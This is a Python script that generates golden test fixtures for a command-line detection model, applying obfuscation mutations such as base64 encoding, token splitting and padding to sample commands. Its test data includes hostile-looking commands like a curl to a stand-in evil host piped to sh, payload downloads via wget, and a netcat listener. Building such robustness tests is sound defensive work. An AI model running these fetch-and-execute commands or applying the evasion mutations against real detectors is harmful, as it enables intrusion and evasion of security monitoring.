"""Generate mutation_parity_golden.jsonl with real mutation + feature values.

Run: python tests/fixtures/generate_mutation_parity_golden.py
"""

import json
from pathlib import Path

from synthaea_ml.data.canonical import ml_cmdline_from_record
from synthaea_ml.evaluation.mutations.cmdline import (
    ArgumentReorderMutator,
    Base64EncodeMutator,
    PaddingMutator,
    PathSubstitutionMutator,
    TokenSplittingMutator,
)
from synthaea_ml.evaluation.mutations.prng import LCG
from synthaea_ml.features.cmdline import extract_features

# Test cases: (original, mutation_class, intensity, seed)
TEST_CASES = [
    # Base64 encode
    ({"argv": ["curl", "-fsSL", "https://evil.example/payload"]}, "base64_encode", "light", 42),
    ({"argv": ["wget", "http://malware.example/payload.sh"]}, "base64_encode", "medium", 42),
    ({"argv": ["sh", "-c", "curl https://evil.test | sh"]}, "base64_encode", "heavy", 42),

    # Argument reorder
    ({"argv": ["bash", "-c", "echo hello"]}, "argument_reorder", "light", 100),
    ({"argv": ["python3", "script.py", "arg1", "arg2"]}, "argument_reorder", "medium", 100),
    ({"argv": ["nc", "-l", "4444"]}, "argument_reorder", "heavy", 42),

    # Path substitution
    ({"argv": ["/bin/bash", "-c", "base64 -d"]}, "path_substitution", "light", 200),
    ({"argv": ["/bin/ls", "/sbin/init"]}, "path_substitution", "medium", 200),
    ({"argv": ["/bin/cat", "/sbin/modprobe", "/tmp/file"]}, "path_substitution", "heavy", 200),

    # Token splitting
    ({"argv": ["base64", "-d"]}, "token_splitting", "light", 300),
    ({"argv": ["python3", "-c", "import os"]}, "token_splitting", "medium", 42),
    ({"argv": ["curl", "https://test.com"]}, "token_splitting", "heavy", 42),

    # Padding
    ({"argv": ["bash", "-c", "echo test"]}, "padding", "light", 400),
    ({"argv": ["curl", "https://api.example/data"]}, "padding", "medium", 42),
    ({"argv": ["wget", "http://evil.test/tool"]}, "padding", "heavy", 42),
]

MUTATORS = {
    "base64_encode": Base64EncodeMutator(),
    "argument_reorder": ArgumentReorderMutator(),
    "path_substitution": PathSubstitutionMutator(),
    "token_splitting": TokenSplittingMutator(),
    "padding": PaddingMutator(),
}


def generate_golden() -> list[dict]:
    """Generate golden test cases with real mutation + feature values."""
    golden_cases = []

    for original, mutation_class, intensity, seed in TEST_CASES:
        mutator = MUTATORS[mutation_class]
        rng = LCG(seed=seed)

        try:
            # Apply mutation
            mutated = mutator.mutate(original, intensity, rng)

            # Extract features
            cmdline_original = ml_cmdline_from_record(original)
            features_original = extract_features(cmdline_original)

            cmdline_mutated = ml_cmdline_from_record(mutated)
            features_mutated = extract_features(cmdline_mutated)

            golden_cases.append({
                "original": original,
                "mutation_class": mutation_class,
                "intensity": intensity,
                "seed": seed,
                "mutated": mutated,
                "features_original": features_original,
                "features_mutated": features_mutated,
            })
        except ValueError as e:
            print(f"WARNING: Skipping {mutation_class}/{intensity} on {original}: {e}")
            continue

    return golden_cases


def main() -> None:
    golden = generate_golden()

    output = Path(__file__).parent / "mutation_parity_golden.jsonl"
    with output.open("w", encoding="utf-8") as f:
        for case in golden:
            f.write(json.dumps(case) + "\n")

    print(f"Generated {len(golden)} test cases to {output}")
    print(f"\nBreakdown:")
    from collections import Counter
    by_mutator = Counter(c["mutation_class"] for c in golden)
    for mutator, count in by_mutator.items():
        print(f"  {mutator}: {count}")


if __name__ == "__main__":
    main()
